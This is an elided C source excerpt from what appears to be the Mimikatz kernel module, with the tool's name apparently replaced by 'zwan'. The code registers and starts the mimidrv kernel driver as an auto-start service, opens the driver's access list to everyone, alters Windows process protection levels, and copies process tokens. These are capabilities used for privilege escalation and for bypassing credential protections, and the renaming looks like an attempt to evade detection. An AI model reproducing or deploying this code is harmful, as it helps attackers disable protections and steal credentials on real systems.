...
const KUHL_K_C kuhl_k_c_kernel[] = {
	{kuhl_m_kernel_add_mimidrv,			0,									L"+",				L"Install and/or start zwan driver (mimidrv)"},
	{kuhl_m_kernel_remove_mimidrv,		0,									L"-",				L"Remove zwan driver (mimidrv)"},
...
{
	wchar_t *absFile, file[] = zwan_DRIVER L".sys";
	...
	{
		if(hS = OpenService(hSC, zwan_DRIVER, SERVICE_START))
		{
			kprintf(L"[+] zwan driver already registered\n");
		}
		else
		{
			if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
			{
				kprintf(L"[*] zwan driver not present\n");
				if(kull_m_file_getAbsolutePathOf(file, &absFile))
				{
					if(kull_m_file_isFileExist(absFile))
					{
						if(hS = CreateService(hSC, zwan_DRIVER, L"zwan driver (" zwan_DRIVER L")", READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, absFile, NULL, NULL, NULL, NULL, NULL))
						{
							kprintf(L"[+] zwan driver successfully registered\n");

							if(kuhl_m_kernel_addWorldTozwan(hS))
								kprintf(L"[+] zwan driver ACL to everyone\n");
							else PRINT_ERROR_AUTO(L"kuhl_m_kernel_addWorldTozwan");
						}
		...
		if(hS)
		{
			if(StartService(hS, 0, NULL))
				kprintf(L"[+] zwan driver started\n");
			else if(GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
				kprintf(L"[*] zwan driver already started\n");
			else
...
BOOL kuhl_m_kernel_addWorldTozwan(SC_HANDLE monHandle)
{
	BOOL status = FALSE;
	DWORD dwSizeNeeded;
...
{
	BOOL toRemove = TRUE;
	if(kull_m_service_stop(zwan_DRIVER))
		kprintf(L"[+] zwan driver stopped\n");
	else if(GetLastError() == ERROR_SERVICE_NOT_ACTIVE)
		kprintf(L"[*] zwan driver not running\n");
	else
	{
		toRemove = FALSE;
	...
	if(toRemove)
	{
		if(kull_m_service_remove(zwan_DRIVER))
			kprintf(L"[+] zwan driver removed\n");
		else
...
NTSTATUS kuhl_m_kernel_processProtect(int argc, wchar_t * argv[])
{
	...
	if(zwan_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_VISTA)
	{
		...
		if(protectInfos.processId)
		{
			if(!isUnprotect)
			{
				if(zwan_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
				{
					protectInfos.SignatureProtection.SignatureLevel = 1;
				}
				else if(zwan_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
				{
...
NTSTATUS kuhl_m_kernel_processToken(int argc, wchar_t * argv[])
{
	...
	if(!tokenInfo.toProcessId)
		kprintf(L" * to 0 will take all \'cmd\' and \'zwan\' process\n");
